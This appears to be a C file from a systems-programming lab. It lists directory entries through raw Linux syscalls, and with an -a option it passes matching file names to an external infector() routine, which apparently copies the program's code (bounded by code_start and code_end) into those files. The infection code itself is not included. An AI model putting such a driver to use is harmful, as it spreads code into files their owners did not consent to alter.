#include "util.h"

#define SYS_READ    3
#define SYS_WRITE   4
#define SYS_OPEN    5
#define SYS_CLOSE    6
#define SYS_LSEEK   19
#define SYS_GETDENTS   141

#define STDOUT      1
#define STDIN       0
#define STDERR      2

#define O_RDONLY    0
#define O_WRONLY    1
#define O_RDRW      2
#define O_APPEND    1024
#define O_TRUNC     512
#define O_CREAT     64

#define SEEK_SEET   0
#define SEEK_CUR    1
#define SEEK_END    2

#define	BUFFER_SIZE	(1024)


 struct ent {
           long             mode;
           int              offset;
           unsigned short   len;
           char             name[];
 };
 
 extern code_start;
 extern code_end;
 int debag = 0;
 
int main (int argc , char* argv[], char* envp[]){
    char buf[BUFFER_SIZE];
    int inputfile;
    int size, index, secindex;
    char* suffix = "null";
    int add_suffix = 0;

    struct ent *fileD;
       
    inputfile = system_call(SYS_OPEN, ".", O_RDONLY, 0777);
    if(inputfile < 0){
        myPrintStrln("Couldn't read from file");
        system_call(SYS_CLOSE, 55, 0, 0);
    }
        
    size = system_call(SYS_GETDENTS, inputfile, buf, BUFFER_SIZE);
    
    if(size < 0){
        myPrintStrln("Couldn't get DENTS file");
        system_call(SYS_CLOSE, 55, 0, 0);
    }
        
    int i;
    for (i = 0 ; i < argc ; i++){
        if(strcmp(argv[i], "-p")==0){            
            suffix = argv[++i];
        }else if(strcmp(argv[i], "-a")==0){            
            add_suffix = 1;
            suffix = argv[++i];
        }else if(strcmp(argv[i], "-d")==0){
            debag = 1;
        }
    }
    
     
    for (index = 0, secindex = 0; index < size;) {
        fileD = (struct ent *) (buf + index);
        char startName = fileD->name[0]; 
        if(secindex > 1 && 
            (strcmp(suffix, "null")==0 || startName == suffix[0]) ){
            if(add_suffix){
                myPrintStrln(fileD->name);               
                infector(fileD->name);
            }
            else{
                myPrintStrln(fileD->name); 
            }
        }
        index += fileD->len;
        secindex++; 
    }
   
   
    
  /*  
   
   infection();

   
    myPrintNumber(&code_start());

    myPrintNumber(&code_end());
    */
    return 0;
}

void myPrintStr(char* str){
        int size;
size = system_call(SYS_WRITE,STDOUT, str,strlen(str));
    if(debag){
        printd(4, size);
    }
}

void myPrintStrln(char* str){
        int size;
size = system_call(SYS_WRITE,STDOUT, str,strlen(str));
    system_call(SYS_WRITE,STDOUT,"\n",1);
    
    if(debag){
        printd(4, size + 1);
    }
}

void myPrintNumber(int number){
    char * str = itoa(number);
        int size;

    size = system_call(SYS_WRITE,STDOUT, str,strlen(str));

    system_call(SYS_WRITE,STDOUT,"\n",1);
    
     if(debag){
        printd(4, size + 1);
    }
}


void myPrintStrlnd(char* str){
    system_call(SYS_WRITE,STDERR, str,strlen(str));
    system_call(SYS_WRITE,STDERR,"\n",1);
}

void myPrintNumberd(int number){
    char * str = itoa(number);
    
    system_call(SYS_WRITE,STDERR, str,strlen(str));

    system_call(SYS_WRITE,STDERR,"\n",1);
}

int printd (int id, int ret) {
        myPrintStrlnd("\nSystm_c id: ");
        myPrintNumberd(id);
        myPrintStrlnd("return code: ");        
        myPrintNumberd(ret);
        
}
